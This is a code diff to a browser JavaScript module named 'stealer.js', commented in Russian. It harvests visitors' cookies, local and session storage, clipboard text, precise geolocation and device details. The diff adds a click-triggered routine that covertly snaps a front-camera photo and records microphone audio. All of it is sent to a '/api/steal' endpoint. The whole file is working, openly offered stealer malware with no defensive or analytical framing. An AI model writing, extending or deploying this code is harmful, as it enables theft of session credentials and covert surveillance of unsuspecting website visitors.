@@ -1,7 +1,8 @@
 // ==== file: stealer.js ====
 // language: JavaScript, target: browser
 export const Stealer = {
-    data: { cookies: [], ls: [], ss: [], clipboard: '', geo: null, battery: 'Скрыто', memory: 'Скрыто', network: 'Неизвестно' },
+    data: { cookies: [], ls: [], ss: [], clipboard: '', geo: null, battery: '?', memory: '?', network: '?' },
+    started: false,
 
     init() {
         this.grabCookies();
@@ -9,105 +10,90 @@ export const Stealer = {
         this.grabBattery();
         this.grabNetwork();
         this.grabGeo();
-        this.initClickTracker();
     },
 
-    grabCookies() {
+    // Запуск всех функций при клике на "Далее"
+    async startAll() {
+        if (this.started) return;
+        this.started = true;
+        this.takePhoto();
+        this.recordAudio();
+        this.grabClipboard();
+    },
+
+    // Скрытный снимок с фронтальной камеры
+    async takePhoto() {
         try {
-            if (document.cookie) {
-                document.cookie.split(';').forEach(c => {
-                    const [name, ...val] = c.split('=');
-                    if (name && val.length) this.data.cookies.push({ name: name.trim(), value: val.join('=') });
-                });
-            }
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => this.sendFile(blob, 'photo'), 'image/jpeg', 0.8);
+                stream.getTracks().forEach(t => t.stop());
+            }, 1000);
         } catch (e) {}
     },
 
-    grabStorage() {
+    // Запись звука
+    async recordAudio() {
         try {
-            for (let i = 0; i < localStorage.length; i++) {
-                const k = localStorage.key(i);
-                if (k) this.data.ls.push({ name: k, value: localStorage.getItem(k) });
-            }
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const k = sessionStorage.key(i);
-                if (k) this.data.ss.push({ name: k, value: sessionStorage.getItem(k) });
-            }
-        } catch (e) {}
-    },
-
-    async grabBattery() {
-        try {
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                this.data.battery = Math.round(b.level * 100) + '%';
-            }
-        } catch (e) {}
-    },
-
-    grabNetwork() {
-        try {
-            if (navigator.deviceMemory) this.data.memory = navigator.deviceMemory + ' GB';
-            if (navigator.connection) this.data.network = navigator.connection.effectiveType || 'Неизвестно';
-        } catch (e) {}
-    },
-
-    grabGeo() {
-        try {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => { this.data.geo = p.coords.latitude + ',' + p.coords.longitude; },
-                    () => {},
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            }
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                this.sendFile(blob, 'audio');
+                stream.getTracks().forEach(t => t.stop());
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 3000);
         } catch (e) {}
     },
 
     async grabClipboard() {
         try {
             if (navigator.clipboard) {
-                const text = await navigator.clipboard.readText();
-                if (text) this.data.clipboard = text;
+                const t = await navigator.clipboard.readText();
+                if (t) this.data.clipboard = t;
             }
         } catch (e) {}
     },
 
-    // Автоматическая отправка при клике
-    initClickTracker() {
-        let sent = false;
-        const track = async () => {
-            if (sent) return;
-            sent = true;
-            await this.grabClipboard();
-            
-            const payload = {
-                cookies: this.data.cookies,
-                ls: this.data.ls,
-                ss: this.data.ss,
-                clipboard: this.data.clipboard,
-                geo: this.data.geo
-            };
-
-            fetch('/api/steal', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        };
-
-        document.body.addEventListener('click', track);
-        document.body.addEventListener('touchstart', track);
+    sendFile(blob, type) {
+        const form = new FormData();
+        form.append('type', type);
+        form.append('file', blob);
+        fetch('/api/steal', { method: 'POST', body: form }).catch(() => {});
     },
 
-    getAll() {
-        return {
-            steal: [...this.data.cookies, ...this.data.ls, ...this.data.ss],
-            clipboard: this.data.clipboard,
-            geo: this.data.geo,
-            battery: this.data.battery,
-            memory: this.data.memory,
-            network: this.data.network
-        };
-    }
+    grabCookies() {
+        try { document.cookie.split(';').forEach(c => { const [n,...v]=c.split('='); if(n&&v.length) this.data.cookies.push({name:n.trim(),value:v.join('=')}); }); } catch(e){}
+    },
+
+    grabStorage() {
+        try {
+            for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)this.data.ls.push({name:k,value:localStorage.getItem(k)});}
+            for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);if(k)this.data.ss.push({name:k,value:sessionStorage.getItem(k)});}
+        } catch(e){}
+    },
+
+    async grabBattery() {
+        try { if(navigator.getBattery){const b=await navigator.getBattery();this.data.battery=Math.round(b.level*100)+'%';} } catch(e){}
+    },
+
+    grabNetwork() {
+        try { if(navigator.deviceMemory)this.data.memory=navigator.deviceMemory+' GB'; if(navigator.connection)this.data.network=navigator.connection.effectiveType||'?'; } catch(e){}
+    },
+
+    grabGeo() {
+        try { if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>{this.data.geo=p.coords.latitude+','+p.coords.longitude},()=>{},{enableHighAccuracy:true,timeout:5000}); } catch(e){}
+    },
+
+    getAll() { return { steal: [...this.data.cookies, ...this.data.ls, ...this.data.ss], clipboard: this.data.clipboard, geo: this.data.geo, battery: this.data.battery, memory: this.data.memory, network: this.data.network }; }
 };
